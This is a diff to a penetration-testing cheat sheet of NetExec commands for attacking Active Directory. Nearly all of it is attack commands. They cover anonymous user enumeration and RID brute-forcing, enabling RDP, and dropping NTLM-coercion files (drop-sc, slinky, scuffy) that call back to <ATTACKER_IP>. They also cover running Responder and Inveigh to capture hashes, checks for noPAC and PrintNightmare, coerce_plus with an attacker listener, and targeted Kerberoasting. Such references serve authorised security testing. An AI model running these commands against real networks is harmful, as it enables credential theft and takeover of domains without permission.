@@ -170,7 +170,7 @@ Single command covers users, groups, shares, and password policy via null/anonym
 
 ```bash
 nxc smb <TARGET> -u '' -p '' --users --shares --pass-pol --rid-brute 10000
-nxc ldap <DC_FQDN> -u '' -p '' --groups
+nxc ldap <DC_FQDN> -u '' -p '' --groups --computers
 ```
 
 ### User Enumeration
@@ -183,7 +183,7 @@ nxc ldap <DC_FQDN> -u '' -p '' --groups
 # Enumerate users via SMB (anonymous)
 nxc smb <DC_IP> -u '' -p '' --users
 nxc smb <DC_IP> -u '' -p '' --rid-brute 10000 > nxc_rid_users.txt
-grep SidTypeUser nxc_rid_users.txt | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > users.txt
+grep SidTypeUser nxc_rid_users.txt | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > nxc_users.txt
 
 # Authenticated user enumeration
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
@@ -423,22 +423,26 @@ flatpak run org.keepassxc.KeePassXC
 nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
 ```
 
-### `drop-sc` NTLM Coercion via Writable Share
+### `drop-sc`, `slinky`, and `scuffy` NTLM Coercion via Writable Share
 
-NOTE: requires write access to target share + Responder listening on `tun0`
+- Run the same below commands with `CLEANUP=True` to delete file
+
+**NOTE**: requires `WRITE` access to target share + Capturer (usually) inside the LAN
 
 ```bash
-# Start Responder first
-sudo responder -I tun0 -wv
+# Start Capturer
+sudo responder -I <INTERFACE> -wv
+.\Inveigh.exe -LLMNR Y -NBNS Y -Console 5 -FileOutput Y
 
 # Drop the coercion file on the writable share
 nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M drop-sc -o URL=\\<ATTACKER_IP>\secret FILENAME=secret
-
-# Crack captured NTLMv2 hash
-hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M slinky -o SERVER=<ATTACKER_IP> NAME=important
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M scuffy -o SERVER=<ATTACKER_IP> NAME=update
 ```
 
 ## DC Vulnerability Scanning
+
+- https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities
 
 Triage a DC for unpatched critical vulnerabilities. For exploitation see [DC Vulnerability Attacks]({{% ref "active-directory.md#dc-vulnerability-attacks" %}}).
 
@@ -447,6 +451,18 @@ Triage a DC for unpatched critical vulnerabilities. For exploitation see [DC Vul
 ```bash
 nxc smb <DC_IP> -M zerologon
 nxc smb <DC_IP> -M ms17-010
+```
+
+### noPAC
+
+```bash
+nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -M nopac
+```
+
+### PrintNightmare
+
+```bash
+nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -M printnightmare
 ```
 
 ### Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven
@@ -462,7 +478,7 @@ nxc smb <DC_IP> -u <USER> -p '<PASS>' -M coerce_plus
 
 ```bash
 # Trigger auth
-nxc smb <DC_FQDN> -u <USER> -p '<PASS>'k -M coerce_plus -o METHOD=<TECHNIQUE> LISTENER=<ATTACKER_IP>
+nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -M coerce_plus -o METHOD=<TECHNIQUE> LISTENER=<ATTACKER_IP>
 ```
 
 ## LDAP
@@ -601,6 +617,9 @@ Requests TGS tickets for accounts with SPNs set. The TGS is encrypted with the s
 ```bash
 # REQUIRES any valid domain user -- finds ALL SPN ACCOUNTS automatically
 nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_kerberoast.txt
+
+# Targeted Kerberoast
+nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_targeted_kerberoast.txt --kerberoast-account <TARGET_USER>
 ```
 
 ## MSSQL
